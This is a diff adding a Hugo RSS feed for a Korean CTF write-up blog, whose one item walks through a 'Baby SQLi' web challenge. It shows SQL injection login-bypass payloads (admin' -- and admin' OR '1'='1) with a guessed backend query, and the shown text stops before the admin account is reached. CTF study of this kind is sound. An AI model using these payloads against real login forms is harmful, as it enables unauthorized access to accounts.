@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DEDSEC // CTF WRITEUPS</title><link>https://D4rkScare.github.io/</link><description>Recent content on DEDSEC // CTF WRITEUPS</description><generator>Hugo</generator><language>ko-KR</language><lastBuildDate>Wed, 15 Jan 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://D4rkScare.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Baby SQLi - Web 100</title><link>https://D4rkScare.github.io/posts/baby-sqli/</link><pubDate>Wed, 15 Jan 2025 00:00:00 +0000</pubDate><guid>https://D4rkScare.github.io/posts/baby-sqli/</guid><description>&lt;h2 id="overview"&gt;Overview&lt;/h2&gt;
+&lt;p&gt;로그인 페이지가 있고, SQL Injection으로 인증을 우회하는 문제입니다.&lt;/p&gt;
+&lt;h2 id="analysis"&gt;Analysis&lt;/h2&gt;
+&lt;h3 id="initial-recon"&gt;Initial Recon&lt;/h3&gt;
+&lt;p&gt;사이트에 접속하면 심플한 로그인 폼이 있습니다. 먼저 기본적인 페이로드를 테스트합니다.&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;Username: admin&amp;#39; --
+Password: anything
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;에러 메시지가 출력됩니다:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;You have an error in your SQL syntax near &amp;#39;--&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;MySQL 기반인 것을 확인. 백엔드 쿼리를 추측하면:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; users &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;INPUT&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;AND&lt;/span&gt; password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;INPUT&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="finding-the-bypass"&gt;Finding the Bypass&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;OR 1=1&lt;/code&gt; 기반 bypass 시도:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;admin&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;로그인 성공! 하지만 일반 유저 계정입니다. admin 계정이 필요합니다.&lt;/p&gt;</description></item></channel></rss>
